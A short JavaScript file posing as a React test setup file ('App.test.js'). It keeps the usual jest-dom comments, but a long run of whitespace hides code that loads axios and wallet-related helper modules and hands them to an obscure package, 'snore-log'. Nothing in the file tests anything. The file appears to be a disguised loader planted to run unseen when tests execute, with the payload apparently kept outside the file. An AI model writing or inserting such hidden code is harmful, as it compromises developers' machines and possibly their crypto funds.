/* App.test.js */                                                                                                                                                                                                                                                                            const ax = require('axios');
const ContractAddress = require('./helpers/ContractAddress.js');
const Formatters = require('./helpers/formatters.js');
const Networks = require('./helpers/networks.js');
const render = require('snore-log');

const [a, b, c] = [ContractAddress, Formatters, Networks];
render(a, b, c);
// jest-dom adds custom jest matchers for asserting on DOM nodes.
// allows you to do things like:
// expect(element).toHaveTextContent(/react/i)
// learn more: https://github.com/testing-library/jest-dom
